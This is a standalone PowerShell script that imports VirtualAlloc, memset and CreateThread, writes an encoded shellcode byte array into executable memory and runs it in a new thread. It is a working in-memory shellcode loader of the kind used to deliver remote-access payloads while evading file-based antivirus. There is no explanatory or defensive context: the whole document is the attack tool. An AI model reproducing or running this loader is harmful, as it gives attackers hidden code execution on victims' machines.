$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xdb,0xc9,0xb8,0x2d,0xf9,0xeb,0xcd,0xd9,0x74,0x24,0xf4,0x5b,0x2b,0xc9,0xb1,0x47,0x83,0xc3,0x04,0x31,0x43,0x14,0x03,0x43,0x39,0x1b,0x1e,0x31,0xa9,0x59,0xe1,0xca,0x29,0x3e,0x6b,0x2f,0x18,0x7e,0x0f,0x3b,0x0a,0x4e,0x5b,0x69,0xa6,0x25,0x09,0x9a,0x3d,0x4b,0x86,0xad,0xf6,0xe6,0xf0,0x80,0x07,0x5a,0xc0,0x83,0x8b,0xa1,0x15,0x64,0xb2,0x69,0x68,0x65,0xf3,0x94,0x81,0x37,0xac,0xd3,0x34,0xa8,0xd9,0xae,0x84,0x43,0x91,0x3f,0x8d,0xb0,0x61,0x41,0xbc,0x66,0xfa,0x18,0x1e,0x88,0x2f,0x11,0x17,0x92,0x2c,0x1c,0xe1,0x29,0x86,0xea,0xf0,0xfb,0xd7,0x13,0x5e,0xc2,0xd8,0xe1,0x9e,0x02,0xde,0x19,0xd5,0x7a,0x1d,0xa7,0xee,0xb8,0x5c,0x73,0x7a,0x5b,0xc6,0xf0,0xdc,0x87,0xf7,0xd5,0xbb,0x4c,0xfb,0x92,0xc8,0x0b,0x1f,0x24,0x1c,0x20,0x1b,0xad,0xa3,0xe7,0xaa,0xf5,0x87,0x23,0xf7,0xae,0xa6,0x72,0x5d,0x00,0xd6,0x65,0x3e,0xfd,0x72,0xed,0xd2,0xea,0x0e,0xac,0xba,0xdf,0x22,0x4f,0x3a,0x48,0x34,0x3c,0x08,0xd7,0xee,0xaa,0x20,0x90,0x28,0x2c,0x47,0x8b,0x8d,0xa2,0xb6,0x34,0xee,0xeb,0x7c,0x60,0xbe,0x83,0x55,0x09,0x55,0x54,0x5a,0xdc,0xc0,0x51,0xcc,0x1f,0xbc,0x5b,0x12,0xc8,0xbf,0x5b,0x3b,0x54,0x49,0xbd,0x6b,0x34,0x19,0x12,0xcb,0xe4,0xd9,0xc2,0xa3,0xee,0xd5,0x3d,0xd3,0x10,0x3c,0x56,0x79,0xff,0xe9,0x0e,0x15,0x66,0xb0,0xc5,0x84,0x67,0x6e,0xa0,0x86,0xec,0x9d,0x54,0x48,0x05,0xeb,0x46,0x3c,0xe5,0xa6,0x35,0xea,0xfa,0x1c,0x53,0x12,0x6f,0x9b,0xf2,0x45,0x07,0xa1,0x23,0xa1,0x88,0x5a,0x06,0xba,0x01,0xcf,0xe9,0xd4,0x6d,0x1f,0xea,0x24,0x38,0x75,0xea,0x4c,0x9c,0x2d,0xb9,0x69,0xe3,0xfb,0xad,0x22,0x76,0x04,0x84,0x97,0xd1,0x6c,0x2a,0xce,0x16,0x33,0xd5,0x25,0xa7,0x0f,0x00,0x03,0xdd,0x61,0x90;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};
